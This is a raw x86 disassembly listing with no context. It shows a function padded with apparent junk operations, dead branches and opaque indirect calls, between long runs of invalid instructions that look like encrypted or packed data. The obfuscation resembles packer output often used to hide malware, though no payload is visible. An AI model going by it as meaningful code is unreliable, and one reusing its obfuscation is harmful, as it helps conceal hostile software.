  4158e5:	arpl   di,cx
  4158e7:	inc    esi
  4158e8:	mov    ebp,0x89313a34
  4158ed:	hlt    
  4158ee:	leave  
  4158ef:	and    DWORD PTR [edx+0x46],0xa4d2959
  4158f6:	mov    ebx,0x445ead76
  4158fb:	add    esi,0x855a2a57
  415901:	std    
  415902:	cs push ebp
  415904:	dec    ecx
  415905:	xchg   edi,eax
  415906:	push   ecx
  415907:	cwde   
  415908:	ins    DWORD PTR es:[edi],dx
  415909:	sbb    BYTE PTR [ecx+0x5fa72b9],ah
  41590f:	push   ds
  415910:	inc    ecx
  415911:	imul   esp,ebx,0x10
  415914:	xchg   esi,eax
  415915:	mov    BYTE PTR [ecx],0x49
  415918:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415919:	inc    ebx
  41591a:	ret    
  41591b:	or     ecx,DWORD PTR [esi+0x6176b17]
  415921:	fist   WORD PTR [ebp-0x2]
  415924:	(bad)  
  415925:	mov    esp,0x54bd98cf
  41592a:	daa    
  41592b:	ss fcomi st,st(4)
  41592e:	test   ebp,esp
  415930:	cmp    dh,cl
  415932:	fpatan 
  415934:	cmp    dl,BYTE PTR ds:0x7a787966
  41593a:	push   edi
  41593b:	pushf  
  41593c:	inc    esp
  41593d:	fcom   st(7)
  41593f:	fld    QWORD PTR [esi-0x701c6d61]
  415945:	hlt    
  415946:	sbb    BYTE PTR [eax+0x903191d],dl
  41594c:	jns    0x415941
  41594e:	add    ebx,DWORD PTR [ebx]
  415950:	and    BYTE PTR es:[eax+0x2d0b5b12],cl
  415957:	retf   
  415958:	mov    edx,0xf520c2b4
  41595d:	fbstp  TBYTE PTR [ebx-0x6d]
  415960:	jo     0x41598c
  415962:	xchg   esi,eax
  415963:	dec    edx
  415964:	shl    BYTE PTR [edx-0x66daba6f],1
  41596a:	mov    cl,0x2e
  41596c:	outs   dx,DWORD PTR ds:[esi]
  41596d:	dec    ecx
  41596e:	push   esp
  41596f:	nop
  415970:	mov    ah,0x9c
  415972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415973:	jg     0x41594a
  415975:	adc    DWORD PTR [edx+0x54d2b74d],esp
  41597b:	inc    esi
  41597c:	adc    BYTE PTR [ebp+0x70],ah
  41597f:	cs nop
  415981:	cwde   
  415982:	and    DWORD PTR [ebx-0xd],ebp
  415985:	pop    ds
  415986:	das    
  415987:	call   0xb91795c1
  41598c:	in     al,0x69
  41598e:	jno    0x41599e
  415990:	fild   WORD PTR [esi+0x1c]
  415993:	pop    ss
  415994:	inc    ebp
  415995:	pop    esi
  415996:	in     eax,0x9b
  415998:	pop    eax
  415999:	mov    ebp,0xaa4a607d
  41599e:	xlat   BYTE PTR ds:[ebx]
  41599f:	pop    eax
  4159a0:	fidivr WORD PTR [eax+ebx*2-0x17]
  4159a4:	cwde   
  4159a5:	xchg   ebx,eax
  4159a6:	adc    al,0x8a
  4159a8:	iret   
  4159a9:	push   0x979147bc
  4159ae:	fwait
  4159af:	jecxz  0x415947
  4159b1:	mov    ds:0x8884d024,eax
  4159b6:	out    0xcf,al
  4159b8:	(bad)  
  4159b9:	out    dx,al
  4159ba:	(bad)  [edi-0x4ebaf4d1]
  4159c0:	mov    eax,DWORD PTR [ebp-0x20]
  4159c3:	xor    edx,eax
  4159c5:	mov    eax,DWORD PTR [ebp-0x24]
  4159c8:	and    edx,eax
  4159ca:	mov    eax,DWORD PTR [ebp+0x10]
  4159cd:	xor    edx,0x7015
  4159d3:	sub    eax,edx
  4159d5:	mov    edx,DWORD PTR [ebp-0x28]
  4159d8:	mov    esi,DWORD PTR [ebp-0x2c]
  4159db:	and    edx,0x2a7b
  4159e1:	lea    edx,[edx+esi*1-0x3571]
  4159e8:	mov    esi,DWORD PTR [ebp-0x30]
  4159eb:	shr    edx,1
  4159ed:	or     edx,esi
  4159ef:	mov    esi,ecx
  4159f1:	sub    esi,edx
  4159f3:	add    esi,0x4751
  4159f9:	cmp    esi,eax
  4159fb:	jbe    0x4152ac
  415a01:	pop    esi
  415a02:	leave  
  415a03:	ret    0xc
  415a06:	push   ebp
  415a07:	mov    ebp,esp
  415a09:	sub    esp,0x7c
  415a0c:	xor    DWORD PTR ds:0x42829b,ebx
  415a12:	push   ebx
  415a13:	push   esi
  415a14:	push   edi
  415a15:	or     DWORD PTR ds:0x4283d7,0x412a
  415a1f:	mov    eax,DWORD PTR [ebp+0x8]
  415a22:	cmp    DWORD PTR ds:0x42826b,0x0
  415a29:	mov    ebx,0x3b8c
  415a2e:	mov    DWORD PTR ds:0x4281cb,0x632c
  415a38:	jmp    0x415aab
  415a3d:	mov    edx,0x517f
  415a42:	mov    edi,DWORD PTR ds:0x42832f
  415a48:	cmp    DWORD PTR ds:0x42826b,0x0
  415a4f:	jae    0x415a95
  415a55:	push   DWORD PTR [ebp-0x14]
  415a58:	push   DWORD PTR [ebp-0x1c]
  415a5b:	push   DWORD PTR [ebp-0x18]
  415a5e:	push   DWORD PTR [ebp-0x18]
  415a61:	push   0x4a1d
  415a66:	push   0x1f83
  415a6b:	push   DWORD PTR [ebp-0x14]
  415a6e:	call   DWORD PTR ds:0x428f24
  415a74:	mov    edi,DWORD PTR ds:0x4281ff
  415a7a:	xor    ecx,ecx
  415a7c:	or     ecx,DWORD PTR ds:0x42821f
  415a82:	sub    edi,ecx
  415a84:	imul   edi,DWORD PTR [edi+ecx*1]
  415a88:	movzx  edx,WORD PTR ds:0x4281b7
  415a8f:	and    DWORD PTR ds:0x4283e3,edx
  415a95:	xor    DWORD PTR ds:0x428283,0x17b
  415a9f:	sbb    DWORD PTR ds:0x428337,ecx
  415aa5:	adc    DWORD PTR ds:0x4281ab,edi
  415aab:	mov    ecx,DWORD PTR [ebp+0xc]
  415aae:	shrd   eax,ecx,0x2
  415ab2:	shr    ecx,0x2
  415ab5:	mov    ecx,DWORD PTR [ebp+0x8]
  415ab8:	and    edi,0x5809
  415abe:	mov    edx,DWORD PTR [ebp+0xc]
  415ac1:	mov    edi,DWORD PTR ds:0x4281b3
  415ac7:	xor    DWORD PTR ds:0x4282df,edi
  415acd:	xor    edx,edx
  415acf:	xor    ebx,ebx
  415ad1:	xor    ebx,DWORD PTR ds:0x42822f
  415ad7:	xor    edi,edi
  415ad9:	or     edi,DWORD PTR ds:0x4282eb
  415adf:	sub    ebx,edi
  415ae1:	or     ebx,DWORD PTR [ebx+edi*1]
  415ae4:	mov    esi,0x329e695d
  415ae9:	xor    eax,esi
  415aeb:	adc    ebx,0x4305
  415af1:	or     eax,edx
  415af3:	mov    DWORD PTR [ebp-0x28],eax
  415af6:	not    edx
  415af8:	mov    eax,DWORD PTR [ebp+0x8]
  415afb:	sbb    DWORD PTR ds:0x4283c3,edx
  415b01:	shl    ecx,0x1e
  415b04:	mov    ecx,DWORD PTR [ebp+0xc]
  415b07:	shrd   eax,ecx,0x2
  415b0b:	adc    ebx,0x5b1c
  415b11:	xor    eax,esi
  415b13:	shr    ecx,0x2
  415b16:	sbb    DWORD PTR ds:0x42828f,ecx
  415b1c:	mov    ecx,DWORD PTR [ebp+0x8]
  415b1f:	mov    edi,DWORD PTR ds:0x42820f
  415b25:	mov    edx,DWORD PTR ds:0x42825f
  415b2b:	sub    edx,edi
  415b2d:	and    edi,DWORD PTR [edi+edx*1]
  415b30:	mov    edx,DWORD PTR [ebp+0xc]
  415b33:	cmp    DWORD PTR ds:0x4283cf,0x0
  415b3a:	not    DWORD PTR ds:0x428353
  415b40:	mov    DWORD PTR ds:0x4282ab,0x4d0
  415b4a:	mov    DWORD PTR ds:0x4281a3,0x25d8
  415b54:	jmp    0x415ba8
  415b59:	mov    DWORD PTR ds:0x4283b3,0x25ca
  415b63:	cmp    DWORD PTR ds:0x4283cf,0x0
  415b6a:	jge    0x415b90
  415b70:	push   DWORD PTR [ebp-0x28]
  415b73:	push   0x42819b
  415b78:	push   0x12d6
  415b7d:	call   DWORD PTR ds:0x428ebc
  415b83:	add    DWORD PTR ds:0x4283ab,0x4989
  415b8d:	inc    edi
  415b8e:	add    edi,ebx
  415b90:	sbb    DWORD PTR ds:0x42835f,0x655f
  415b9a:	mov    ebx,DWORD PTR ds:0x42832b
  415ba0:	adc    DWORD PTR ds:0x428367,ebx
  415ba6:	xor    edi,edi
  415ba8:	xor    edx,edx
  415baa:	add    ebx,edi
  415bac:	or     eax,edx
  415bae:	cmp    DWORD PTR ds:0x4281bf,0x0
  415bb5:	mov    DWORD PTR ds:0x4281b7,0x74bf
  415bbf:	mov    DWORD PTR ds:0x428337,0x4195
  415bc9:	jmp    0x415c2e
  415bce:	mov    ebx,0x25c0
  415bd3:	mov    ebx,0x1763
  415bd8:	cmp    DWORD PTR ds:0x4281bf,0x0
  415bdf:	jl     0x415c13
  415be5:	push   0x432b
  415bea:	push   0x428297
  415bef:	call   DWORD PTR ds:0x428ec0
  415bf5:	sub    edi,DWORD PTR ds:0x4283e3
  415bfb:	sbb    DWORD PTR ds:0x428367,ecx
  415c01:	and    edx,DWORD PTR ds:0x4281d7
  415c07:	mov    edi,DWORD PTR ds:0x42827f
  415c0d:	and    DWORD PTR ds:0x4281bb,edi
  415c13:	or     DWORD PTR ds:0x4281b3,0x73d6
  415c1d:	mov    edi,DWORD PTR ds:0x4281e3
  415c23:	mov    edx,DWORD PTR ds:0x42836b
  415c29:	sub    edi,edx
  415c2b:	xor    edi,DWORD PTR [edi+edx*1]
  415c2e:	mov    DWORD PTR [ebp-0x28],eax
  415c31:	cmp    DWORD PTR ds:0x4283af,0x0
  415c38:	mov    DWORD PTR ds:0x4283db,ebx
  415c3e:	mov    DWORD PTR ds:0x4281af,ecx
  415c44:	jmp    0x415cab
  415c49:	mov    DWORD PTR ds:0x4281cb,edx
  415c4f:	cmp    DWORD PTR ds:0x4283af,0x0
  415c56:	jbe    0x415ca1
  415c5c:	push   0x6725
  415c61:	push   0x42834b
  415c66:	push   0x8698
  415c6b:	push   0x6e02
  415c70:	push   0x538f
  415c75:	push   DWORD PTR [ebp-0x24]
  415c78:	push   0x8d72
  415c7d:	push   0x8325
  415c82:	call   DWORD PTR ds:0x428e10
  415c88:	mov    edi,DWORD PTR ds:0x428207
  415c8e:	mov    edx,DWORD PTR ds:0x42838f
  415c94:	sub    edi,edx
  415c96:	sub    edi,DWORD PTR [edi+edx*1]
  415c99:	add    DWORD PTR ds:0x428367,ebx
  415c9f:	or     edx,ebx
  415ca1:	add    edx,edi
  415ca3:	or     ebx,ebx
  415ca5:	and    ebx,DWORD PTR ds:0x42827f
  415cab:	mov    eax,ds:0x422418
  415cb0:	xor    edx,0x5bba
  415cb6:	mov    eax,DWORD PTR [eax]
  415cb8:	or     ebx,edx
  415cba:	mov    DWORD PTR [ebp-0xc],eax
  415cbd:	and    edi,0x77ac
  415cc3:	mov    eax,ds:0x422638
  415cc8:	mov    eax,DWORD PTR [eax]
  415cca:	cmp    DWORD PTR ds:0x4283cb,0x0
  415cd1:	mov    edi,DWORD PTR ds:0x4282bb
  415cd7:	mov    ebx,DWORD PTR ds:0x4283e3
  415cdd:	mov    DWORD PTR ds:0x428283,0x6f52
  415ce7:	jmp    0x415d31
  415cec:	mov    DWORD PTR ds:0x4283bb,0x23d0
  415cf6:	cmp    DWORD PTR ds:0x4283cb,0x0
  415cfd:	ja     0x415d21
  415d03:	push   DWORD PTR [ebp-0x18]
  415d06:	push   0x1c98
  415d0b:	push   DWORD PTR [ebp-0x1c]
  415d0e:	push   DWORD PTR [ebp-0xc]
  415d11:	call   DWORD PTR ds:0x428e14
  415d17:	or     ebx,edx
  415d19:	or     edx,edi
  415d1b:	adc    edi,0x39b9
  415d21:	and    edx,DWORD PTR ds:0x4282a7
  415d27:	sbb    edx,edi
  415d29:	add    edx,edi
  415d2b:	sbb    ebx,0x45bb
  415d31:	mov    DWORD PTR [ebp-0x10],eax
  415d34:	xor    DWORD PTR ds:0x4282bf,0x4282a3
  415d3e:	mov    eax,DWORD PTR [ebp-0xc]
  415d41:	sbb    DWORD PTR ds:0x42834f,0x4085
  415d4b:	mov    eax,DWORD PTR [ebp-0xc]
  415d4e:	mov    ebx,DWORD PTR [ebp+0x8]
  415d51:	cmp    DWORD PTR ds:0x428367,0x0
  415d58:	mov    DWORD PTR ds:0x4282c3,0x5216
  415d62:	not    DWORD PTR ds:0x42829b
  415d68:	mov    edi,0x3d1c
  415d6d:	mov    DWORD PTR ds:0x4282bb,0x4705
  415d77:	jmp    0x415dc1
  415d7c:	mov    DWORD PTR ds:0x4282db,ebx
  415d82:	cmp    DWORD PTR ds:0x428367,0x0
  415d89:	jg     0x415da3
  415d8f:	push   0x4280fb
  415d94:	push   0x4280a9
  415d99:	call   DWORD PTR ds:0x428e18
  415d9f:	and    edx,edx
  415da1:	sub    edi,edi
  415da3:	xor    edx,edx
  415da5:	xor    edx,DWORD PTR ds:0x4282bf
  415dab:	sbb    DWORD PTR ds:0x4283e3,edx
  415db1:	or     DWORD PTR ds:0x4283c3,ebx
  415db7:	sbb    DWORD PTR ds:0x4282e3,0x12ba
  415dc1:	shl    ecx,0x1e
  415dc4:	xor    ecx,ecx
  415dc6:	adc    DWORD PTR ds:0x42835f,ecx
  415dcc:	shld   ecx,eax,0x2
  415dd0:	shl    eax,0x2
  415dd3:	mov    edi,0xca79a575
  415dd8:	mov    edx,0x9c1b89e8
  415ddd:	or     DWORD PTR ds:0x42819f,0x4c83
  415de7:	mov    DWORD PTR [ebp-0x38],ebx
  415dea:	mov    ebx,DWORD PTR [ebp+0xc]
  415ded:	xor    DWORD PTR ds:0x428197,0x6279
  415df7:	xor    eax,edi
  415df9:	sub    DWORD PTR ds:0x4281db,0x4281a3
  415e03:	xor    ecx,edx
  415e05:	mov    DWORD PTR ds:0x4281db,0x1398
  415e0f:	mov    DWORD PTR [ebp-0x1c],0xa4069bae
  415e16:	mov    DWORD PTR ds:0x4283af,0x5e42
  415e20:	mov    DWORD PTR [ebp-0x18],0xa40692ae
  415e27:	mov    DWORD PTR [ebp-0x34],ebx
  415e2a:	mov    DWORD PTR ds:0x4282b7,0x218e
  415e34:	cmp    eax,DWORD PTR [ebp-0x38]
  415e37:	mov    DWORD PTR ds:0x4282e3,0x534
  415e41:	jne    0x415e59
  415e47:	mov    DWORD PTR ds:0x42828f,0x12af
  415e51:	cmp    ecx,ebx
  415e53:	je     0x416649
  415e59:	mov    eax,DWORD PTR [ebp-0x10]
  415e5c:	adc    DWORD PTR ds:0x4282bf,edx
  415e62:	mov    eax,DWORD PTR [ebp-0x10]
  415e65:	xor    ecx,ecx
  415e67:	shld   ecx,eax,0x2
  415e6b:	and    DWORD PTR ds:0x428347,0x4281cf
  415e75:	shl    eax,0x2
  415e78:	xor    ecx,edx
  415e7a:	cmp    DWORD PTR ds:0x4281b3,0x0
  415e81:	not    edx
  415e83:	mov    DWORD PTR ds:0x42835f,edx
  415e89:	mov    edx,0x6413
  415e8e:	jmp    0x415f0c
  415e93:	mov    DWORD PTR ds:0x4281cf,0x1988
  415e9d:	mov    DWORD PTR ds:0x4282d7,0x1d2b
  415ea7:	cmp    DWORD PTR ds:0x4281b3,0x0
  415eae:	je     0x415ee8
  415eb4:	push   0x6b61
  415eb9:	push   0x4c93
  415ebe:	call   DWORD PTR ds:0x428e1c
  415ec4:	or     DWORD PTR ds:0x428273,0x4f44
  415ece:	or     edx,0x2695
  415ed4:	sub    DWORD PTR ds:0x4283ab,0x174
  415ede:	mov    DWORD PTR ds:0x4283cf,0x41a3
  415ee8:	mov    edx,DWORD PTR ds:0x4283cb
  415eee:	add    edx,DWORD PTR ds:0x4281af
  415ef4:	mov    DWORD PTR ds:0x4283cb,edx
  415efa:	or     DWORD PTR ds:0x4283b7,ecx
  415f00:	mov    edx,DWORD PTR ds:0x428367
  415f06:	or     DWORD PTR ds:0x4282c7,edx
  415f0c:	mov    edx,DWORD PTR [ebp+0x8]
  415f0f:	xor    eax,edi
  415f11:	mov    DWORD PTR ds:0x4282d7,ecx
  415f17:	mov    edi,DWORD PTR [ebp+0xc]
  415f1a:	cmp    eax,edx
  415f1c:	jne    0x415f34
  415f22:	cmp    ecx,edi
  415f24:	mov    DWORD PTR ds:0x42835f,0x9a6
  415f2e:	je     0x416649
  415f34:	cmp    DWORD PTR ds:0x428193,0x0
  415f3b:	mov    DWORD PTR ds:0x4281b7,0x3be3
  415f45:	movzx  ebx,WORD PTR ds:0x4283b7
  415f4c:	not    edi
  415f4e:	jmp    0x415fba
  415f53:	mov    DWORD PTR ds:0x428357,ebx
  415f59:	cmp    DWORD PTR ds:0x428193,0x0
  415f60:	jne    0x415fad
  415f66:	push   0x3f61
  415f6b:	push   0x3f0f
  415f70:	push   DWORD PTR [ebp-0x18]
  415f73:	push   0x84fe
  415f78:	push   DWORD PTR [ebp-0x18]
  415f7b:	push   DWORD PTR [ebp-0x10]
  415f7e:	push   0x689e
  415f83:	push   DWORD PTR [ebp-0x18]
  415f86:	push   0x8af6
  415f8b:	call   DWORD PTR ds:0x428f28
  415f91:	xor    DWORD PTR ds:0x4283e7,edx
  415f97:	sbb    edi,DWORD PTR ds:0x4282c3
  415f9d:	sub    DWORD PTR ds:0x42827f,0x4f5e
  415fa7:	sub    ecx,DWORD PTR ds:0x4283bb
  415fad:	add    edi,0xe71
  415fb3:	dec    ecx
  415fb4:	and    ecx,DWORD PTR ds:0x428363
  415fba:	mov    eax,DWORD PTR [ebp-0x18]
  415fbd:	and    DWORD PTR ds:0x4283b3,ebx
  415fc3:	mov    ecx,DWORD PTR [ebp-0x18]
  415fc6:	push   0xfffffffe
  415fc8:	pop    ebx
  415fc9:	and    DWORD PTR ds:0x4281cb,0xd25
  415fd3:	xor    ecx,ebx
  415fd5:	movzx  edi,BYTE PTR ds:0x4281cb
  415fdc:	add    DWORD PTR ds:0x4282b3,edi
  415fe2:	shl    ecx,0x1e
  415fe5:	cmp    DWORD PTR ds:0x42827f,0x0
  415fec:	mov    DWORD PTR ds:0x4283d3,ecx
  415ff2:	mov    edi,0x37d1
  415ff7:	mov    DWORD PTR ds:0x4283e7,0x730b
  416001:	mov    edi,0x60e5
  416006:	jmp    0x416062
  41600b:	mov    DWORD PTR ds:0x4283b3,0x1cd3
  416015:	mov    DWORD PTR ds:0x4281af,0x4bc0
  41601f:	cmp    DWORD PTR ds:0x42827f,0x0
  416026:	jg     0x41603f
  41602c:	push   0x1ec5
  416031:	call   DWORD PTR ds:0x428f2c
  416037:	add    DWORD PTR ds:0x4281b3,edx
  41603d:	neg    edi
  41603f:	mov    DWORD PTR ds:0x428357,0x2c32
  416049:	and    edi,DWORD PTR ds:0x42828f
  41604f:	and    edi,0x1973
  416055:	movzx  edi,WORD PTR ds:0x428287
  41605c:	adc    DWORD PTR ds:0x4282ab,edi
  416062:	mov    edi,0xa4069aaf
  416067:	and    DWORD PTR ds:0x4283db,0x1058
  416071:	xor    eax,edi
  416073:	sub    DWORD PTR ds:0x428347,0x4282bf
  41607d:	shr    eax,0x2
  416080:	or     eax,ecx
  416082:	cmp    DWORD PTR ds:0x4281cf,0x0
  416089:	mov    DWORD PTR ds:0x428367,0x1e83
  416093:	mov    DWORD PTR ds:0x4283c3,edx
  416099:	movzx  ecx,WORD PTR ds:0x42829b
  4160a0:	jmp    0x4160ed
  4160a5:	not    ecx
  4160a7:	mov    ecx,DWORD PTR ds:0x4281d3
  4160ad:	cmp    DWORD PTR ds:0x4281cf,0x0
  4160b4:	jg     0x4160e2
  4160ba:	push   DWORD PTR [ebp-0x20]
  4160bd:	push   DWORD PTR [ebp-0x18]
  4160c0:	call   DWORD PTR ds:0x428e20
  4160c6:	adc    DWORD PTR ds:0x42835b,edi
  4160cc:	or     DWORD PTR ds:0x42829b,0x4a59
  4160d6:	mov    ecx,DWORD PTR ds:0x42826f
  4160dc:	sub    DWORD PTR ds:0x4281cb,ecx
  4160e2:	add    DWORD PTR ds:0x4282bf,0x16e5
  4160ec:	dec    ecx
  4160ed:	mov    DWORD PTR [ebp-0x34],eax
  4160f0:	mov    eax,ds:0x422598
  4160f5:	and    ecx,DWORD PTR ds:0x4282af
  4160fb:	mov    DWORD PTR [ebp-0x34],eax
  4160fe:	mov    eax,DWORD PTR [ebp-0xc]
  416101:	mov    DWORD PTR [ebp-0x14],eax
  416104:	xor    DWORD PTR ds:0x4283bb,ecx
  41610a:	mov    ecx,DWORD PTR [ebp-0x14]
  41610d:	or     DWORD PTR ds:0x4283d3,0x5817
  416117:	push   0x4
  416119:	cmp    DWORD PTR ds:0x4281cb,0x0
  416120:	mov    DWORD PTR ds:0x4283b3,0x7b16
  41612a:	mov    DWORD PTR ds:0x4281cf,0x195b
  416134:	jmp    0x41618b
  416139:	mov    DWORD PTR ds:0x4282ab,0x5f2a
  416143:	cmp    DWORD PTR ds:0x4281cb,0x0
  41614a:	jle    0x41616d
  416150:	push   DWORD PTR [ebp-0x20]
  416153:	call   DWORD PTR ds:0x428f30
  416159:	xor    DWORD PTR ds:0x4281a7,0x42819b
  416163:	sub    DWORD PTR ds:0x428193,0x4281bf
  41616d:	sbb    DWORD PTR ds:0x4282cf,0x4282c7
  416177:	and    DWORD PTR ds:0x4282bf,0x56d1
  416181:	xor    DWORD PTR ds:0x4282ab,0x1431
  41618b:	pop    eax
  41618c:	or     DWORD PTR ds:0x42829f,0x4281db
  416196:	sub    eax,ecx
  416198:	mov    ecx,DWORD PTR [ebp-0x10]
  41619b:	add    ecx,eax
  41619d:	mov    DWORD PTR [ebp-0x24],ecx
  4161a0:	mov    ecx,DWORD PTR ds:0x42824f
  4161a6:	mov    ecx,DWORD PTR [ecx]
  4161a8:	sbb    DWORD PTR ds:0x4281d3,ecx
  4161ae:	lea    eax,[ebp-0x30]
  4161b1:	mov    DWORD PTR [ebp-0x2c],eax
  4161b4:	and    eax,0x1e1b
  4161b9:	mov    eax,DWORD PTR [ebp-0x1c]
  4161bc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4161bf:	xor    eax,edi
  4161c1:	xor    ecx,ebx
  4161c3:	sub    DWORD PTR ds:0x4281cb,0x4282a7
  4161cd:	shr    eax,0x2
  4161d0:	and    DWORD PTR ds:0x4282cb,0x42828b
  4161da:	shl    ecx,0x1e
  4161dd:	sbb    DWORD PTR ds:0x428357,0x42826b
  4161e7:	or     eax,ecx
  4161e9:	or     DWORD PTR ds:0x4282c3,0x697f
  4161f3:	mov    DWORD PTR [ebp-0x20],eax
  4161f6:	mov    DWORD PTR [ebp-0x8],0xa4069abe
  4161fd:	mov    eax,DWORD PTR [ebp-0x8]
  416200:	mov    ecx,DWORD PTR [ebp-0x8]
  416203:	xor    eax,edi
  416205:	xor    ecx,ebx
  416207:	shr    eax,0x2
  41620a:	shl    ecx,0x1e
  41620d:	or     ecx,eax
  41620f:	push   ecx
  416210:	lea    eax,[ebp-0x8]
  416213:	push   eax
  416214:	lea    eax,[ebp-0x7c]
  416217:	push   eax
  416218:	call   0x415231
  41621d:	mov    eax,DWORD PTR [ebp-0x8]
  416220:	mov    ecx,DWORD PTR [ebp-0x8]
  416223:	xor    eax,edi
  416225:	xor    ecx,ebx
  416227:	shr    eax,0x2
  41622a:	shl    ecx,0x1e
  41622d:	or     ecx,eax
  41622f:	push   ecx
  416230:	lea    eax,[ebp-0x14]
  416233:	push   eax
  416234:	mov    eax,DWORD PTR [ebp+0x8]
  416237:	mov    ecx,DWORD PTR [ebp+0xc]
  41623a:	shrd   eax,ecx,0x2
  41623e:	shr    ecx,0x2
  416241:	mov    ecx,DWORD PTR [ebp+0x8]
  416244:	mov    edx,DWORD PTR [ebp+0xc]
  416247:	xor    eax,esi
  416249:	xor    edx,edx
  41624b:	or     eax,edx
  41624d:	lea    eax,[ebp+eax*4-0x78]
  416251:	push   eax
  416252:	shl    ecx,0x1e
  416255:	call   0x415231
  41625a:	mov    eax,DWORD PTR [ebp-0x8]
  41625d:	mov    ecx,DWORD PTR [ebp-0x8]
  416260:	xor    eax,edi
  416262:	xor    ecx,ebx
  416264:	shr    eax,0x2
  416267:	shl    ecx,0x1e
  41626a:	or     ecx,eax
  41626c:	push   ecx
  41626d:	lea    eax,[ebp-0x24]
  416270:	push   eax
  416271:	mov    eax,DWORD PTR [ebp+0x10]
  416274:	mov    ecx,DWORD PTR [ebp+0x14]
  416277:	shrd   eax,ecx,0x2
  41627b:	shr    ecx,0x2
  41627e:	mov    ecx,DWORD PTR [ebp+0x10]
  416281:	mov    edx,DWORD PTR [ebp+0x14]
  416284:	xor    eax,esi
  416286:	xor    edx,edx
  416288:	or     eax,edx
  41628a:	lea    eax,[ebp+eax*4-0x78]
  41628e:	push   eax
  41628f:	shl    ecx,0x1e
  416292:	call   0x415231
  416297:	mov    eax,DWORD PTR [ebp-0x8]
  41629a:	mov    ecx,DWORD PTR [ebp-0x8]
  41629d:	xor    ecx,ebx
  41629f:	xor    eax,edi
  4162a1:	shl    ecx,0x1e
  4162a4:	shr    eax,0x2
  4162a7:	or     ecx,eax
  4162a9:	push   ecx
  4162aa:	lea    eax,[ebp-0x20]
  4162ad:	push   eax
  4162ae:	mov    eax,DWORD PTR [ebp+0x10]
  4162b1:	mov    ecx,DWORD PTR [ebp+0x14]
  4162b4:	shrd   eax,ecx,0x2
  4162b8:	shr    ecx,0x2
  4162bb:	mov    ecx,DWORD PTR [ebp+0x10]
  4162be:	mov    edx,DWORD PTR [ebp+0x14]
  4162c1:	xor    edx,edx
  4162c3:	xor    eax,esi
  4162c5:	or     eax,edx
  4162c7:	shl    ecx,0x1e
  4162ca:	mov    ecx,DWORD PTR [ebp+0x10]
  4162cd:	mov    edx,DWORD PTR [ebp+0x14]
  4162d0:	shrd   ecx,edx,0x2
  4162d4:	shr    edx,0x2
  4162d7:	mov    edx,DWORD PTR [ebp+0x10]
  4162da:	mov    ebx,DWORD PTR [ebp+0x14]
  4162dd:	xor    ecx,esi
  4162df:	xor    ebx,ebx
  4162e1:	or     ecx,ebx
  4162e3:	add    eax,ecx
  4162e5:	lea    eax,[ebp+eax*4-0x78]
  4162e9:	push   eax
  4162ea:	shl    edx,0x1e
  4162ed:	call   0x415231
  4162f2:	mov    eax,DWORD PTR [ebp-0x8]
  4162f5:	mov    ecx,DWORD PTR [ebp-0x8]
  4162f8:	xor    ecx,0xfffffffe
  4162fb:	shl    ecx,0x1e
  4162fe:	jmp    0x41655e
  416303:	sbb    eax,0x26add60b
  416308:	lods   eax,DWORD PTR ds:[esi]
  416309:	sbb    bh,BYTE PTR [edx-0x45]
  41630c:	xor    bl,BYTE PTR [ebx+0x70]
  41630f:	fwait
  416310:	jg     0x4162eb
  416312:	mov    esp,0x181600f4
  416317:	fwait
  416318:	adc    al,0x18
  41631a:	sbb    BYTE PTR [ecx-0x3c],bh
  41631d:	or     esp,ecx
  41631f:	inc    esi
  416320:	iret   
  416321:	(bad)  
  416323:	sbb    BYTE PTR [eax],dh
  416325:	jnp    0x416303
  416327:	pusha  
  416328:	fcmovnb st,st(6)
  41632a:	cmp    eax,0x2c736dd3
  41632f:	(bad)  
  416330:	mov    ebx,0x538c2bb0
  416335:	loopne 0x4163b0
  416337:	add    bl,BYTE PTR [edi+0x74]
  41633a:	xchg   ebx,eax
  41633b:	arpl   WORD PTR [esi-0x67],bp
  41633e:	repnz pop edi
  416340:	aas    
  416341:	pop    ss
  416342:	add    al,0x45
  416344:	ins    BYTE PTR es:[edi],dx
  416345:	mov    ds:0x3d45d67b,eax
  41634a:	sub    DWORD PTR [ebx],edi
  41634c:	adc    al,0x1f
  41634e:	loope  0x41633f
  416350:	clc    
  416351:	stc    
  416352:	mov    edx,0x69e87987
  416357:	jmp    0x6c91:0x6d8e8c30
  41635e:	(bad)  
  41635f:	into   
  416360:	ret    0x2ce6
  416363:	jle    0x4163b7
  416365:	es push 0xffffff99
  416368:	dec    edx
  416369:	sub    eax,0x7d5996eb
  41636e:	xchg   ecx,eax
  41636f:	push   ebx
  416370:	pop    edi
  416371:	dec    ecx
  416372:	or     eax,0xba37c724
  416377:	mov    al,gs:0x7add5f31
  41637d:	jp     0x4163fd
  41637f:	xor    DWORD PTR [ebx],ecx
  416381:	lds    esi,FWORD PTR [ecx-0x6eb3605c]
  416387:	mov    BYTE PTR [ecx+0x25],dh
  41638a:	xor    eax,0xa93ceaa
  41638f:	lea    esi,[edi]
  416391:	hlt    
  416392:	mul    ebx
  416394:	fwait
  416395:	pop    ds
  416396:	cmp    eax,0x12e4415
  41639b:	push   edx
  41639c:	leave  
  41639d:	sahf   
  41639e:	sbb    BYTE PTR [ebx],dh
  4163a0:	hlt    
  4163a1:	neg    BYTE PTR [ebx+0x4f2229a3]
  4163a7:	pop    es
  4163a8:	mov    ds:0x7557c840,eax
  4163ad:	mov    ebp,0xa8562c1e
  4163b2:	mov    ds:0x2ca598f4,al
  4163b7:	cmp    al,0xd5
  4163b9:	popa   
  4163ba:	sub    al,0xab
  4163bc:	aam    0x8f
  4163be:	scas   eax,DWORD PTR es:[edi]
  4163bf:	mov    al,ds:0x16d6056c
  4163c4:	adc    cl,BYTE PTR [edi+edx*1]
  4163c7:	cdq    
  4163c8:	xchg   esp,eax
  4163c9:	loope  0x4163eb
  4163cb:	sub    ch,BYTE PTR [eax+edx*2+0x44]
  4163cf:	push   ebp
  4163d0:	pop    edi
  4163d1:	push   cs
  4163d2:	add    ah,bl
  4163d4:	adc    edi,DWORD PTR [eax+0x55a7aac0]
  4163da:	jecxz  0x41639f
  4163dc:	xchg   esi,eax
  4163dd:	push   eax
  4163de:	jae    0x41641b
  4163e0:	mov    ebx,0x8041f3de
  4163e5:	push   eax
  4163e6:	push   cs
  4163e7:	inc    edi
  4163e8:	xchg   edi,eax
  4163e9:	xchg   edx,eax
  4163ea:	(bad)  
  4163eb:	rcr    DWORD PTR [ecx+ebx*1-0x76ee06ad],1
